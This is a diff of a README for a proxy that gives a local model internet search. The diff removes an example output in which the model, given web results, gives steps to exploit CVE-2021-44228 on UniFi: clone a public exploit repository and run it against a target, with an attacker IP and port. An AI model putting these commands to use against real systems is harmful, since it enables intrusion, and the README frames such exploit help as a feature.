@@ -52,20 +52,6 @@ http://localhost:11435/v1/
  
 That's it. Your model now has internet access on every query.
  
-## Example output
- 
-**Without proxy** — model only uses vault notes, gives generic steps.
- 
-**With proxy** — model receives web results and gives specific, current exploit details:
- 
-```
-Para explorar o CVE-2021-44228 no UniFi, use o script do repositório
-puzzlepeaches/Log4jUnifi:
- 
-git clone https://github.com/puzzlepeaches/Log4jUnifi.git
-python exploit.py -u https://<TARGET>:8443 -i <YOUR_IP> -p 4444
-```
- 
 ## Configuration
  
 Edit the top of `proxy.py`:
@@ -106,3 +92,4 @@ Tested with `qwen2.5-coder:14b`.
 ## License
  
 MIT
+ 
